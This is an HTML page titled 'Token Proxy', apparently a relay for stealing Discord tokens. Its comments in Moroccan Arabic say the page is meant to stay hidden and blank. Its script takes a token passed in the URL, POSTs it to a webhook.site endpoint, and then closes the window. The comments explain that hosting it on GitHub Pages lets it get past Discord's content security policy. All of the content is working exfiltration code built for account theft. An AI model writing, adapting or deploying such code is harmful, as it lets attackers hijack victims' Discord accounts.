<!DOCTYPE html>
<html>
<head>
    <title>Token Proxy</title>
    <!-- Had l'page ghadi tkon makhfiya, ma kayban fiha walou -->
    <script>
        const WEBHOOK_SITE_URL = "https://webhook.site/discordquest"; 

        const params = new URLSearchParams(window.location.search);
        let dataToSend;

        if (params.has('d')) {
            const secretData = params.get('d');
            dataToSend = { d: secretData }; // Data with tag and token
        } else if (params.has('err')) {
            const errorToken = params.get('err');
            dataToSend = { err: errorToken }; // Fallback with raw token
        }

        if (dataToSend) {
            // Ghadi ndirou l'POST request l'webhook.site men had l'page dial GitHub Pages
            // Had l'connection ma ghat'violīch l'CSP dial Discord hit Discord ghir 7el pop-up l'github.io
            // W l'origine dial had l'fetch request huwa github.io, li webhook.site kayqbel bih
            fetch(WEBHOOK_SITE_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(dataToSend)
            })
            .then(response => {
                if (!response.ok) {
                    console.error('Webhook.site proxy error, status:', response.status);
                }
                return response.text(); // Nqraw l'response gha bach nlogiw
            })
            .then(text => {
                console.log('Token data forwarded to webhook.site successfully from proxy. Response:', text);
            })
            .catch(error => {
                console.error('Error forwarding token data to webhook.site from proxy:', error);
            })
            .finally(() => {
                // Nseddou l'fenêtre dial proxy f'l'aḥir
                window.close();
            });
        } else {
             // Close if no data to send (e.g., direct access to proxy.html)
            window.close();
        }
    </script>
</head>
<body>
    <!-- Had l'page ghadi tban khawya w makhfiya -->
</body>
</html>
